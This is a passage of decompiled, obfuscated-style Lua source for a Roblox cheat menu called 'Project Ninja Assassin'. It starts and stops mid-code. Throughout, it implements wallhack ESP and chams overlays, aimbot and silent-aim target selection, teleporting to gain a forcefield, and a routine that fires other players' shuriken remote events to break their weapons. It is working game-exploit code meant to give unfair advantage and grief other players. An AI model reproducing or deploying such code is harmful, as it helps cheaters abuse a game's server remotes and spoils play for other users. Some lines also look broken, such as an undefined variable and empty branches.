            end)()
            if v454 then
                vu66:FireServer(v454, pu449)
            end
        end
    }
}
local vu456 = vu44:CreateWindow({
    Title = "Project Ninja Assassin v" .. vu47,
    SubTitle = "by 7 Big Guys",
    TabWidth = 160,
    Size = UDim2.fromOffset(580, 460),
    Acrylic = true,
    Theme = "Darker",
    MinimizeKey = Enum.KeyCode.LeftAlt
})
local vu457 = {}
local v458 = vu456
vu457.Home = vu456.AddTab(v458, {
    Title = "Home",
    Icon = "home"
})
local v459 = vu456
vu457.Changelog = vu456.AddTab(v459, {
    Title = "Changelog",
    Icon = "mail"
})
local v460 = vu456
vu457.Training = vu456.AddTab(v460, {
    Title = "Training",
    Icon = "axe"
})
local v461 = vu456
vu457.Lists = vu456.AddTab(v461, {
    Title = "Lists",
    Icon = "scroll"
})
local v462 = vu456
vu457.Combat = vu456.AddTab(v462, {
    Title = "Combat",
    Icon = "swords"
})
local v463 = vu456
vu457.Players = vu456.AddTab(v463, {
    Title = "Players",
    Icon = "user-cog"
})
local v464 = vu456
vu457.Server = vu456.AddTab(v464, {
    Title = "Server",
    Icon = "server"
})
local v465 = vu456
vu457.Cosmetics = vu456.AddTab(v465, {
    Title = "Cosmetics",
    Icon = "shirt"
})
local v466 = vu456
vu457.Music = vu456.AddTab(v466, {
    Title = "Music",
    Icon = "music"
})
local v467 = vu456
vu457.Leaderboard = vu456.AddTab(v467, {
    Title = "Leaderboard",
    Icon = "clipboard-list"
})
local v468 = vu456
vu457.Misc = vu456.AddTab(v468, {
    Title = "Miscellaneous",
    Icon = "folder-plus"
})
local v469 = vu456
vu457.Credits = vu456.AddTab(v469, {
    Title = "Credits",
    Icon = "link-2"
})
local v470 = vu456
vu457.Settings = vu456.AddTab(v470, {
    Title = "Settings",
    Icon = "settings"
})
local function vu476(p471)
    local v472, v473, v474 = pairs(p471)
    while true do
        local v475
        v474, v475 = v472(v473, v474)
        if v474 == nil then
            break
        end
        vu70[v474] = v475 or false
    end
end
function vu71.Chat(p477, p478, p479)
    local v480 = (p478 or "{System}") .. " " .. p477
    local v481 = "#" .. (p479 and p479:ToHex() or Color3.fromRGB(0, 255, 40):ToHex())
    local v482 = string.gsub(tostring(string.gsub("<font color=\"COLOR\">MSG</font>", "COLOR", tostring(v481))), "MSG", tostring(v480))
    vu62.TextChannels.RBXGeneral:DisplaySystemMessage(v482)
end
function vu71.Notify(p483, p484)
    if vu68 ~= "Fluent" then
        vu71.Chat(p484)
    else
        vu44:Notify({
            Title = p483,
            Content = p484,
            Duration = vu69
        })
    end
end
function vu71.GetRoot(p485)
    return p485:FindFirstChild("HumanoidRootPart") or (p485:FindFirstChild("Torso") or p485:FindFirstChild("UpperTorso"))
end
function vu71.CheckAllParts(p486)
    local v487, v488, v489 = pairs(vu73.BodyParts)
    while true do
        local v490
        v489, v490 = v487(v488, v489)
        if v489 == nil then
            break
        end
        if not p486:FindFirstChild(v490) then
            p486:WaitForChild(v490, math.huge)
        end
    end
    return true
end
function vu71.CommaValue(p491)
    if not tonumber(p491) then
        return p491
    end
    local v492, v493, v494 = string.match(p491, "^([^%d]*%d)(%d*)(.-)$")
    return v492 .. v493:reverse():gsub("(%d%d%d)", "%1,"):reverse() .. v494
end
function vu71.HighNumberFormat(p495)
    if not tonumber(p495) then
        return p495
    end
    local v496
    if string.sub(p495, 1, 1) ~= "-" then
        v496 = false
    else
        p495 = string.sub(p495, 2, string.len(p495))
        v496 = true
    end
    for v497 = 1, # vu72 do
        if tonumber(p495) < 10 ^ (v497 * 3) then
            local v498 = math.floor(p495 / (10 ^ ((v497 - 1) * 3) / 100)) / 100 .. vu72[v497]
            if v496 then
                v498 = "-" .. v498
            end
            return v498
        end
    end
end
function vu71.Format(p499)
    return string.format("%02i", p499)
end
function vu71.Round(p500, p501)
    local v502 = 10 ^ (p501 or 0)
    return math.floor(p500 * v502 + 0.5) / v502
end
function vu71.ConvertToHMS(p503)
    local v504 = tonumber(p503)
    local v505 = math.floor(v504)
    local v506 = math.floor(v504 / 60)
    local v507 = math.floor(v504 / 60 / 60)
    local v508 = v505 - v506 * 60
    local v509 = v506 - v507 * 60
    return vu71.Format(v507) .. ":" .. vu71.Format(v509) .. ":" .. vu71.Format(v508)
end
function vu71.CreateTween(p510, p511, p512, p513, pu514)
    local vu515 = game:GetService("TweenService"):Create(p510, p511, p512)
    if p513 == "NoWait" or p513 == true then
        vu515:Play()
        tweencreateconnect = vu515.Completed:Connect(function()
            vu515:Destroy()
            if pu514 then
                pu514()
            end
            tweencreateconnect:Disconnect()
        end)
    else
        if p513 ~= "Wait" then
            return vu515
        end
        vu515:Play()
        vu515.Completed:Wait()
        vu515:Destroy()
    end
end
function vu71.GetBubble()
    if vu64 and vu71.GetRoot(vu64) then
        local v516 = vu71.GetRoot(vu64)
        local v517 = v516.CFrame
        if vu64:FindFirstChild("ForceField") then
            return
        end
        if vu64.Humanoid.Health == vu64.Humanoid.MaxHealth then
            repeat
                v516.CFrame = CFrame.new(70, 98, - 335)
                task.wait(0.03)
            until vu64:FindFirstChild("ForceField")
            v516.CFrame = v517
        end
    end
end
function vu71.InitCharacterTouched(pu518, pu519)
    if pu518.Character then
        vu71.CheckAllParts(pu518.Character)
        local v520, v521, v522 = pairs(pu518.Character:GetDescendants())
        while true do
            local v523
            v522, v523 = v520(v521, v522)
            if v522 == nil then
                break
            end
            if v523:IsA("BasePart") then
                v523.Touched:Connect(function(p524)
                    if pu519 ~= "Local" then
                        if pu519 == "WL" then
                            local v525, v526, v527 = pairs(vu71.WhitelistCharacterTouched)
                            while true do
                                local v528
                                v527, v528 = v525(v526, v527)
                                if v527 == nil then
                                    break
                                end
                                v528(p524, pu518)
                            end
                        end
                    else
                        local v529, v530, v531 = pairs(vu71.CharacterTouched)
                        while true do
                            local v532
                            v531, v532 = v529(v530, v531)
                            if v531 == nil then
                                break
                            end
                            v532(p524)
                        end
                    end
                end)
            end
        end
    end
end
function vu71.ListFind(p533, p534, p535, p536)
    local v537, v538, v539 = pairs(vu74[p533])
    while true do
        local v540
        v539, v540 = v537(v538, v539)
        if v539 == nil then
            break
        end
        if p535 == nil then
            if p535 == nil then
                local v541, v542, v543 = pairs(v540)
                while true do
                    local v544
                    v543, v544 = v541(v542, v543)
                    if v543 == nil then
                        break
                    end
                    if v544 == p534 then
                        return v543
                    end
                end
            end
        elseif v539 == p535 and p536 == nil or (v539 == p535 and (p536 ~= nil and p536 == false) or v539 ~= p535 and (p536 ~= nil and p536 == true)) then
            local v545, v546, v547 = pairs(v540)
            while true do
                local v548
                v547, v548 = v545(v546, v547)
                if v547 == nil then
                    break
                end
                if v548 == p534 then
                    return v547
                end
            end
        end
    end
    return nil
end
function vu71.BreakShurs(p549)
    local function v555(p550)
        local v551, v552, v553 = pairs(p550)
        while true do
            local v554
            v553, v554 = v551(v552, v553)
            if v553 == nil then
                break
            end
            if v554.Name == "Shuriken" then
                v554:WaitForChild("HitEvent"):FireServer(Vector2.new())
            end
        end
    end
    local v556 = p549.Character
    local v557 = p549:FindFirstChild("Backpack")
    if v557 then
        v555(v557:GetChildren())
    end
    if v556 then
        v555(v556:GetChildren())
    end
end
function vu71.StartPlayerBreaking(pu558, p559, p560)
    if p560 and vu71.ListFind(p560, pu558.Name) or not p560 then
        repeat
            task.wait()
        until pu558:FindFirstChild("Backpack") and pu558.Backpack:FindFirstChild("Shuriken") or newChar:FindFirstChild("Shuriken")
        task.wait()
        vu71.BreakShurs(pu558)
        vu70[p559 .. pu558.Name] = pu558.CharacterAdded:Connect(function(p561)
            repeat
                task.wait()
            until pu558:FindFirstChild("Backpack") and pu558.Backpack:FindFirstChild("Shuriken") or p561:FindFirstChild("Shuriken")
            task.wait()
            vu71.BreakShurs(pu558)
        end)
    end
end
function vu71.StopPlayerBreaking(p562, p563)
    if vu70[p563 .. p562.Name] ~= nil and typeof(vu70[p563 .. p562.Name]) == "RBXScriptConnection" then
        vu70[p563 .. p562.Name]:Disconnect()
        vu70[p563 .. p562.Name] = nil
    end
end
function vu71.ListRemoveFunction(p564, p565)
    local v566 = vu53:FindFirstChild(p565)
    if p564 == "BreakShurlist" and v566 then
        vu71.StopPlayerBreaking(v566, "BreakShurs")
    elseif p564 == "DisableShurslist" and v566 then
        vu71.StopPlayerBreaking(v566, "DisableShurs")
    end
end
function vu71.ListRemove(p567, p568, p569)
    if p569 == nil then
        local v570, v571, v572 = pairs(vu74[p567])
        while true do
            local v573
            v572, v573 = v570(v571, v572)
            if v572 == nil then
                break
            end
            local v574, v575, v576 = pairs(v573)
            local v577 = v572
            while true do
                local v578
                v576, v578 = v574(v575, v576)
                if v576 == nil then
                    break
                end
                if v578 == p568 then
                    vu74[p567][v577][v576] = nil
                end
            end
        end
    elseif vu74[p567][p569][p568] ~= nil then
        vu74[p567][p569][p568] = nil
    end
    vu71.ListRemoveFunction(p567, p568)
end
function vu71.ListInsertFunction(p579, p580)
    local vu581 = vu53:FindFirstChild(p580)
    if p579 == "Whitelist" and vu581 then
        vu71.InitCharacterTouched(vu581, "WL")
        vu581.CharacterAdded:Connect(function()
            vu71.InitCharacterTouched(vu581, "WL")
        end)
    elseif p579 == "BreakShurlist" and (vu70.BreakShurs and vu581) then
        vu71.StartPlayerBreaking(vu581, "BreakShurs", "BreakShurlist")
    elseif p579 == "DisableShurslist" and (vu70.DisableShurs and vu581) then
        vu71.StartPlayerBreaking(vu581, "DisableShurs")
    end
end
function vu71.ListInsert(p582, p583, p584)
    vu74[p582][p584][p583] = p583
    vu71.ListInsertFunction(p582, p583)
end
function vu71.ListEmpty(p585)
    if p585 then
        local v586, v587, v588 = pairs(vu74[p585])
        while true do
            local v589
            v588, v589 = v586(v587, v588)
            if v588 == nil then
                break
            end
            if next(v589) ~= nil then
                return false
            end
        end
        return true
    end
    local v590, v591, v592 = pairs(vu74)
    local v593 = {}
    while true do
        local v594
        v592, v594 = v590(v591, v592)
        if v592 == nil then
            break
        end
        local v595, v596, v597 = pairs(v594)
        while true do
            local v598
            v597, v598 = v595(v596, v597)
            if v597 == nil then
                break
            end
            if next(v598) == nil then
                table.insert(v593, true)
            else
                table.insert(v593, false)
            end
        end
    end
    return v593
end
function vu71.ListClear(p599, p600)
    if p599 then
        local v601, v602, v603 = pairs(vu74[p599])
        while true do
            local v604, v605 = v601(v602, v603)
            if v604 == nil then
                break
            end
            if p600 and v604 == p600 then
                local v606, v607, v608 = pairs(v605)
                v603 = v604
                while true do
                    local v609
                    v608, v609 = v606(v607, v608)
                    if v608 == nil then
                        break
                    end
                    vu74[p599][v604][v608] = nil
                end
            elseif p600 then
                v603 = v604
            else
                local v610, v611, v612 = pairs(v605)
                v603 = v604
                while true do
                    local v613
                    v612, v613 = v610(v611, v612)
                    if v612 == nil then
                        break
                    end
                    vu74[p599][v604][v612] = nil
                end
            end
        end
    else
        local v614, v615, v616 = pairs(vu74)
        while true do
            local v617
            v616, v617 = v614(v615, v616)
            if v616 == nil then
                break
            end
            local v618, v619, v620 = pairs(v617)
            local v621 = v616
            while true do
                local v622, v623 = v618(v619, v620)
                if v622 == nil then
                    break
                end
                if p600 and v621 == p600 then
                    local v624, v625, v626 = pairs(v623)
                    v620 = v622
                    while true do
                        local v627
                        v626, v627 = v624(v625, v626)
                        if v626 == nil then
                            break
                        end
                        vu74[v621][v622][v626] = nil
                    end
                elseif p600 then
                    v620 = v622
                else
                    local v628, v629, v630 = pairs(v623)
                    v620 = v622
                    while true do
                        local v631
                        v630, v631 = v628(v629, v630)
                        if v630 == nil then
                            break
                        end
                        vu74[v621][v622][v630] = nil
                    end
                end
            end
        end
    end
end
function vu71.IsListPlayerInServer(p632)
    local v633, v634, v635 = pairs(vu74[p632])
    while true do
        local v636
        v635, v636 = v633(v634, v635)
        if v635 == nil then
            break
        end
        local v637, v638, v639 = pairs(v636)
        while true do
            local v640
            v639, v640 = v637(v638, v639)
            if v639 == nil then
                break
            end
            if vu53:FindFirstChild(v640) then
                return v639
            end
        end
    end
    return nil
end
function vu71.GetListPlayersInServer(p641, p642)
    local v643, v644, v645 = pairs(vu74[p641])
    local v646 = {}
    while true do
        local v647
        v645, v647 = v643(v644, v645)
        if v645 == nil then
            break
        end
        if p642 and v645 == p642 then
            local v648, v649, v650 = pairs(v647)
            while true do
                local v651
                v650, v651 = v648(v649, v650)
                if v650 == nil then
                    break
                end
                if vu53:FindFirstChild(v651) then
                    v646[v651] = true
                end
            end
        elseif not p642 then
            local v652, v653, v654 = pairs(v647)
            while true do
                local v655
                v654, v655 = v652(v653, v654)
                if v654 == nil then
                    break
                end
                if vu53:FindFirstChild(v655) then
                    v646[v655] = true
                end
            end
        end
    end
    return v646
end
function vu71.PlayersToStrings(p656)
    local v657, v658, v659 = pairs(p656)
    local v660 = {}
    while true do
        local v661
        v659, v661 = v657(v658, v659)
        if v659 == nil then
            break
        end
        if typeof(v661) ~= "Instance" then
            table.insert(v660, v661)
        else
            table.insert(v660, v661.Name)
        end
    end
    return v660
end
function vu71.ESP(pu662)
    task.spawn(function()
        local v663 = vu57
        local v664, v665, v666 = pairs(v663:GetChildren())
        while true do
            local v667, v668 = v664(v665, v666)
            if v667 == nil then
                break
            end
            v666 = v667
            if v668.Name == pu662.Name .. "_PNAESP" then
                v668:Destroy()
            end
        end
        task.wait(0.03)
        if pu662.Character and pu662.Name ~= vu53.LocalPlayer.Name and not vu57:FindFirstChild(pu662.Name .. "_PNAESP") then
            local vu669 = Instance.new("Folder")
            vu669.Name = pu662.Name .. "_PNAESP"
            vu669.Parent = vu57
            vu71.CheckAllParts(pu662.Character)
            if pu662.Character:FindFirstChild("Head") then
                local v670 = Instance.new("BillboardGui")
                local vu671 = Instance.new("TextLabel")
                v670.Adornee = pu662.Character.Head
                v670.Name = pu662.Name
                v670.Parent = vu669
                v670.Size = UDim2.new(0, 100, 0, 150)
                v670.StudsOffset = Vector3.new(0, 1, 0)
                v670.AlwaysOnTop = true
                vu671.Parent = v670
                vu671.BackgroundTransparency = 1
                vu671.Position = UDim2.new(0, 0, 0, - 50)
                vu671.Size = UDim2.new(0, 100, 0, 100)
                vu671.Font = Enum.Font.SourceSansSemibold
                vu671.TextSize = 20
                vu671.TextColor3 = Color3.new(1, 1, 1)
                vu671.TextStrokeTransparency = 0
                vu671.TextYAlignment = Enum.TextYAlignment.Bottom
                vu671.Text = "Name: " .. pu662.Name
                vu671.ZIndex = 10
                local vu672 = nil
                local vu673 = nil
                vu673 = pu662.CharacterAdded:Connect(function()
                    if vu70.ESP then
                        vu672:Disconnect()
                        vu669:Destroy()
                        vu71.CheckAllParts(pu662.Character)
                        vu71.ESP(pu662)
                        vu673:Disconnect()
                    else
                        vu673:Disconnect()
                    end
                end)
                local function v680()
                    if vu57:FindFirstChild(pu662.Name .. "_PNAESP") then
                        if pu662.Character and vu71.GetRoot(pu662.Character) and (pu662.Character:FindFirstChildOfClass("Humanoid") and (vu53.LocalPlayer.Character and vu71.GetRoot(vu53.LocalPlayer.Character)) and vu53.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")) then
                            local v674 = ""
                            local v675 = ""
                            local v676 = not vu70.ESPSettings.Distance and "" or " | " .. vu71.CommaValue(math.floor((vu71.GetRoot(vu53.LocalPlayer.Character).Position - vu71.GetRoot(pu662.Character).Position).Magnitude)) .. " Studs away"
                            local v677, v678
                            if vu70.ESPSettings.Godded then
                                v677 = vu71.IsGodded(pu662.Character) and " | Godded" or " | Not Godded"
                                v678 = "\n"
                            else
                                v678 = ""
                                v677 = ""
                            end
                            if vu70.ESPSettings.Bubble then
                                v675 = pu662.Character:FindFirstChildOfClass("ForceField") and " | Has Bubble" or " | No Bubble"
                                v678 = "\n"
                            end
                            if vu70.ESPSettings.State then
                                v674 = pu662.Character:FindFirstChildOfClass("Humanoid") and pu662.Character:FindFirstChildOfClass("Humanoid").Health <= 0 and "Dead" or (pu662.Character:FindFirstChildOfClass("Humanoid") and "Alive" or "Unknown")
                                v678 = "\n"
                            end
                            vu671.Text = pu662.Name .. v676 .. v678 .. v674 .. v675 .. v677 .. "\n" .. vu71.CommaValue(vu71.Round(pu662.Character:FindFirstChildOfClass("Humanoid").Health, 1))
                            if vu71.IsGodded(pu662.Character) then
                                vu671.TextColor3 = Color3.fromRGB(13, 105, 172)
                            elseif pu662.Character:FindFirstChildOfClass("Humanoid").Health <= 0 or pu662.Character:FindFirstChildOfClass("ForceField") then
                                vu671.TextColor3 = Color3.fromRGB(255, 0, 0)
                            else
                                local v679 = math.clamp(pu662.Character:FindFirstChildOfClass("Humanoid").Health / pu662.Character:FindFirstChildOfClass("Humanoid").MaxHealth, 0, 1)
                                vu671.TextColor3 = Color3.fromHSV(v679 / 3, 1, 1)
                            end
                        end
                    else
                        vu673:Disconnect()
                        vu672:Disconnect()
                    end
                end
                vu672 = vu55.RenderStepped:Connect(v680)
            end
        end
    end)
end
function vu71.Chams(pu681)
    task.spawn(function()
        local v682 = vu57
        local v683, v684, v685 = pairs(v682:GetChildren())
        while true do
            local v686, v687 = v683(v684, v685)
            if v686 == nil then
                break
            end
            v685 = v686
            if v687.Name == pu681.Name .. "_PNACHMS" then
                v687:Destroy()
            end
        end
        task.wait(0.03)
        if pu681.Character and pu681.Name ~= vu53.LocalPlayer.Name and not vu57:FindFirstChild(pu681.Name .. "_PNACHMS") then
            local vu688 = Instance.new("Folder")
            vu688.Name = pu681.Name .. "_PNACHMS"
            vu688.Parent = vu57
            vu71.CheckAllParts(pu681.Character)
            local v689, v690, v691 = pairs(pu681.Character:GetChildren())
            local vu692 = {}
            while true do
                local v693
                v691, v693 = v689(v690, v691)
                if v691 == nil then
                    break
                end
                if v693:IsA("BasePart") then
                    local v694 = Instance.new("BoxHandleAdornment")
                    v694.Name = pu681.Name
                    v694.Parent = vu688
                    v694.Adornee = v693
                    v694.AlwaysOnTop = true
                    v694.ZIndex = 10
                    v694.Size = v693.Size
                    v694.Transparency = 0.3
                    v694.Color3 = Color3.new(1, 1, 1)
                    table.insert(vu692, v694)
                end
            end
            local vu695 = nil
            local vu696 = nil
            vu695 = pu681.CharacterAdded:Connect(function()
                if vu70.Chams then
                    vu688:Destroy()
                    vu71.CheckAllParts(pu681.Character)
                    vu71.Chams(pu681)
                    vu695:Disconnect()
                else
                    vu695:Disconnect()
                end
            end)
            local function v705()
                if vu57:FindFirstChild(pu681.Name .. "_PNACHMS") then
                    if pu681.Character and vu71.GetRoot(pu681.Character) and pu681.Character:FindFirstChildOfClass("Humanoid") then
                        local v697 = pu681.Character:FindFirstChildOfClass("Humanoid").Health > 0
                        local v698 = pu681.Character:FindFirstChildOfClass("ForceField")
                        local v699 = vu71.IsGodded(pu681.Character)
                        local v700, v701, v702 = pairs(vu692)
                        while true do
                            local v703
                            v702, v703 = v700(v701, v702)
                            if v702 == nil then
                                break
                            end
                            if v699 then
                                v703.Color3 = Color3.fromRGB(13, 105, 172)
                            elseif v697 and not v698 then
                                local v704 = math.clamp(pu681.Character:FindFirstChildOfClass("Humanoid").Health / pu681.Character:FindFirstChildOfClass("Humanoid").MaxHealth, 0, 1)
                                v703.Color3 = Color3.fromHSV(v704 / 3, 1, 1)
                            else
                                v703.Color3 = Color3.fromRGB(255, 0, 0)
                            end
                        end
                    end
                else
                    vu695:Disconnect()
                    vu696:Disconnect()
                end
            end
            vu696 = vu55.RenderStepped:Connect(v705)
        end
    end)
end
function vu71.WeaponESP(p706)
    if p706.Character and p706 ~= vu53.LocalPlayer then
        local v707, v708, v709 = pairs(p706.Character:GetChildren())
        while true do
            local vu710
            v709, vu710 = v707(v708, v709)
            if v709 == nil then
                break
            end
            if (vu710.Name == "Shuriken" or vu710.Name == "Sword") and (vu710:IsA("Tool") and not vu710:FindFirstChild("WeaponESP")) then
                local v711 = Instance.new("BillboardGui")
                local v712 = Instance.new("TextLabel")
                v711.Adornee = vu710
                v711.Parent = vu710
                v711.Size = UDim2.new(0, 100, 0, 150)
                v711.StudsOffset = Vector3.new(0, 1, 0)
                v711.AlwaysOnTop = true
                v711.Name = "WeaponESP"
                v712.Parent = v711
                v712.BackgroundTransparency = 1
                v712.Position = UDim2.new(0, 0, 0, - 50)
                v712.Size = UDim2.new(0, 100, 0, 100)
                v712.Font = Enum.Font.SourceSansSemibold
                v712.TextSize = 15
                v712.TextColor3 = (function(_)
                    if vu710.Name ~= "Sword" then
                        return Color3.fromRGB(255, 0, 0)
                    else
                        return Color3.fromRGB(255, 167, 25)
                    end
                end)(vu710.Name)
                v712.TextStrokeTransparency = 0
                v712.TextYAlignment = Enum.TextYAlignment.Bottom
                v712.Text = vu710.Name
                v712.ZIndex = 10
                v712.Visible = true
            end
        end
    end
end
function vu71.WeaponChams(p713)
    if p713.Character and p713 ~= vu53.LocalPlayer then
        local v714, v715, v716 = pairs(p713.Character:GetChildren())
        while true do
            local vu717
            v716, vu717 = v714(v715, v716)
            if v716 == nil then
                break
            end
            if (vu717.Name == "Shuriken" or vu717.Name == "Sword") and (vu717:IsA("Tool") and not vu717:FindFirstChild("WeaponChams")) then
                local function v718(_)
                    if vu717.Name ~= "Sword" then
                        return Color3.fromRGB(255, 0, 0)
                    else
                        return Color3.fromRGB(255, 167, 25)
                    end
                end
                local v719 = Instance.new("BoxHandleAdornment")
                v719.Name = "WeaponChams"
                v719.Parent = vu717
                v719.Adornee = vu717:FindFirstChild("Handle")
                if vu717.Name ~= "Sword" then
                    v719.Size = Vector3.new(1.5, 0.5, 1.5)
                else
                    v719.Size = vu717:FindFirstChild("Handle").Size
                end
                v719.AlwaysOnTop = true
                v719.ZIndex = 10
                v719.Transparency = 0.3
                v719.Color3 = v718(vu717.Name)
                v719.Visible = true
            end
        end
    end
end
function vu71.AddPlayerVanities(p720, p721)
    repeat
        task.wait()
    until p720.Character
    if vu70.ESP and (not p721 or p721 and not vu57:FindFirstChild(p720.Name .. "_PNAESP")) then
        vu71.ESP(p720)
    end
    if vu70.Chams and (not p721 or p721 and not vu57:FindFirstChild(p720.Name .. "_PNACHMS")) then
        vu71.Chams(p720)
    end
end
function vu71.RemovePlayerVanities(p722)
    if vu57:FindFirstChild(p722.Name .. "_PNAESP") then
        vu57:FindFirstChild(p722.Name .. "_PNAESP"):Destroy()
    end
    if vu57:FindFirstChild(p722.Name .. "_PNACHMS") then
        vu57:FindFirstChild(p722.Name .. "_PNACHMS"):Destroy()
    end
end
function vu71.IsGodded(p723)
    local v724 = (p723:IsA("Model") or not p723.Character or (not p723.Character:FindFirstChild("Humanoid") or p723.Character.Humanoid.Health < 1e16)) and (p723:IsA("Model") and p723:FindFirstChild("Humanoid"))
    if v724 then
        v724 = p723.Humanoid.Health >= 1e16
    end
    return v724
end
function vu71.IsAlive(p725)
    local v726 = p725:FindFirstChild("Humanoid")
    if v726 then
        v726 = p725.Humanoid:GetState() ~= Enum.HumanoidStateType.Dead and p725.Humanoid.Health > 0
    end
    return v726
end
function vu71.CanBeHit(p727)
    local v728 = (vu70.FireOnGodMode or not vu71.IsGodded(p727)) and vu71.IsAlive(p727)
    if v728 then
        v728 = not p727:FindFirstChild("ForceField")
    end
    return v728
end
function vu71.GetAimPart(p729)
    return p729:FindFirstChild(vu70.AimPart)
end
function vu71.WhitelistFilter(p730, p731)
    local v732
    if p730 == "Whitelist" or vu71.ListFind("Whitelist", p731) then
        if p730 == "Whitelist" then
            v732 = vu71.ListFind("Whitelist", p731)
        else
            v732 = false
        end
    else
        v732 = true
    end
    return v732
end
function vu71.ClosestPlayer()
    local v733 = math.huge
    local v734 = vu56
    local v735, v736, v737 = pairs(v734:GetChildren())
    local v738 = nil
    while true do
        local v739
        v737, v739 = v735(v736, v737)
        if v737 == nil then
            break
        end
        if vu64 and (v739 ~= vu64 and (vu71.GetAimPart(v739) and (vu71.GetAimPart(vu64) and (vu71.CanBeHit(v739) and not vu71.ListFind("Whitelist", v739.Name))))) then
            local v740 = vu64
            local v741 = (v739:FindFirstChild(vu70.AimPart).Position - v740:FindFirstChild(vu70.AimPart).Position).Magnitude
            if v741 < v733 then
                v738 = v739
                v733 = v741
            end
        end
    end
    return v738
end
function vu71.GetTargetPlayer(p742)
    local v743 = vu53.LocalPlayer.leaderstats.Ninjutsu.Value > 0
    local v744 = v743 and not p742 and {
        "Targetlist",
        "Blacklist"
    } or (v743 and {
        "Targetlist"
    } or {
        "Whitelist"
    })
    local v745, v746, v747 = pairs(v744)
    local v748 = nil
    local v749 = false
    while true do
        local v750
        v747, v750 = v745(v746, v747)
        if v747 == nil then
            break
        end
        if not vu71.ListEmpty(v750) and vu71.IsListPlayerInServer(v750) then
            local v751, v752, v753 = pairs(vu74[v750])
            v749 = true
            while true do
                local v754
                v753, v754 = v751(v752, v753)
                if v753 == nil then
                    break
                end
                local v755, v756, v757 = pairs(v754)
                while true do
                    local v758
                    v757, v758 = v755(v756, v757)
                    if v757 == nil then
                        break
                    end
                    local v759 = vu53:FindFirstChild(v758)
                    if v759 and (v759.Character and (v759.Character ~= vu64 and (vu71.WhitelistFilter(v750, v759.Name) and vu71.CanBeHit(v759.Character)))) then
                        v748 = v759.Character
                    end
                end
            end
        end
    end
    if not (table.find(v744, "Whitelist") or (v748 or (v749 or p742))) then
        v748 = vu71.ClosestPlayer()
    end
    return v748
end
function vu71.BoolsToBinary(p760)
    local v761 = ""
    for v762 = 1, # p760 do
        if p760[v762] ~= true then
            v761 = v761 .. "0"
        else
            v761 = v761 .. "1"
        end
    end
    return v761
end
function vu71.FormallyWaitForChild(p763, p764)
    local v765 = false
    repeat
        task.wait()
    until p763:FindFirstChild(p764) or p763.Parent ~= workspace and p763.Parent ~= vu56
    if p763:FindFirstChild(p764) then
        v765 = p763:FindFirstChild(p764)
    end
    return v765
end
function vu71.IsPlayerClose(p766, p767)
    return p767 and (p766.Position - p767.Position).Magnitude <= 80 and true or false
end
function vu71.IsPlayerExtremelyClose(p768, p769)
    return p769 and (p768.Position - p769.Position).Magnitude <= 10 and true or false
end
function vu71.AddToFilterList(p770)
    if p770:IsA("BasePart") or (p770:IsA("MeshPart") or p770:IsA("Part")) then
        if p770:FindFirstAncestorOfClass("Model") and not vu53:GetPlayerFromCharacter(p770:FindFirstAncestorOfClass("Model")) or not p770:FindFirstAncestorOfClass("Model") then
            if (p770.CanCollide == false or p770.CanTouch == false) and not table.find(vu70.FilterList, p770) then
                table.insert(vu70.FilterList, p770)
            end
        elseif p770:FindFirstAncestorOfClass("Model") and p770:FindFirstAncestorOfClass("Model").Name == vu53.LocalPlayer.Name or p770.Name == vu53.LocalPlayer.Name then
            table.insert(vu70.FilterList, p770)
        end
    end
end
function vu71.RemoveFromFilterList(p771)
    if table.find(vu70.FilterList, p771) then
        table.remove(vu70.FilterList, table.find(vu70.FilterList, p771))
    end
end
function vu71.CreateRaycastParams()
    local v772 = RaycastParams.new()
    v772.FilterDescendantsInstances = vu70.FilterList
    v772.FilterType = Enum.RaycastFilterType.Blacklist
    v772.IgnoreWater = false
    return v772
end
function vu71.ShotgunFireWait()
    if vu70.ShotgunFire then
        local v773 = math.random(150, 250)
        task.wait(v773 / 1000)
    end
end
function vu71.ConnectShurikenTouched(pu774)
    pu774.Touched:Connect(function(p775)
        if p775:FindFirstAncestorOfClass("Model") and vu53:GetPlayerFromCharacter(p775:FindFirstAncestorOfClass("Model")) then
            local v776 = p775:FindFirstAncestorOfClass("Model")
            if v776:FindFirstChild("Head") and v776.Head:FindFirstChild("DamageBBGui") then
                pu774:Destroy()
            end
        end
    end)
end
function vu71.SilentAimPreFunctions(p777)
    vu71.ShotgunFireWait()
    vu71.ConnectShurikenTouched(p777)
    return false, 0, vu71.CreateRaycastParams()
end
function vu71.SkyfallShuriken(p778)
    if vu64 then
        local v779 = vu71.GetRoot(vu64)
        if not vu70.AirStrikeMode or (vu70.ShotgunFire or not v779) then
        end
        task.wait()
        local v780 = 0
        while true do
            if v779 then
                p778.CFrame = CFrame.new(v779.Position.X, v779.Position.Y + 300, v779.Position.Z)
            end
            v780 = v780 + 1
            if v780 == 5 then
            end
        end
    else
        return
    end
end
function vu71.GetRaycastResult(p781, p782)
    if not p782 then
        return p781 and true or p781
    end
    local v783 = p781 and (p781.Instance:FindFirstAncestorOfClass("Model") and p781.Instance:FindFirstAncestorOfClass("Model"):FindFirstChild("Humanoid"))
    if v783 then
        v783 = vu53:FindFirstChild(p781.Instance:FindFirstAncestorOfClass("Model").Name)
    end
    return v783
end
function vu71.CloseAndInRange(p784, p785, p786)
    if vu71.IsPlayerClose(p784, p785) and vu71.GetRaycastResult(p786, true) or vu71.IsPlayerExtremelyClose(p784, p785) then
        if not table.find(vu70.PlrsTooClose, p784.Parent.Name) then
            table.insert(vu70.PlrsTooClose, p784.Parent.Name)
        end
        return true
    else
        if table.find(vu70.PlrsTooClose, p784.Parent.Name) then
            table.remove(vu70.PlrsTooClose, table.find(vu70.PlrsTooClose, p784.Parent.Name))
        end
        return false
    end
end
function vu71.GetPostSilentAimVariables(p787, p788, p789)
    return workspace:Raycast(p787.Position, p787.CFrame.LookVector * 15, p788), vu71.GetAimPart(p789), vu71.GetRoot(vu64), vu71.FormallyWaitForChild(p787, "BodyVelocity")
end
function vu71.ShurikenProximityCheck(p790, p791, p792, p793, p794)
    if not p790 or (p791 or not p792) then
        return false
    end
    p794.CFrame = p792.CFrame
    p793.Velocity = Vector3.new(0, 0, 0)
    return true
end
function vu71.CalculateBodyVelocity(p795, p796, p797)
    local v798 = (p795.Position - p796.Position).Magnitude
    return v798 > 1000 and math.floor(v798 * 5 + 700) or (vu70.RapidMode and 700 * vu70.RapidMultiplier or (not vu70.AirStrikeMode and (p797 and 300) or 700))
end
function vu71.SaveSettings()
    local v799 = game:GetService("HttpService")
    if writefile then
        local v800, v801, v802 = pairs(vu74)
        local v803 = {}
        while true do
            local v804
            v802, v804 = v800(v801, v802)
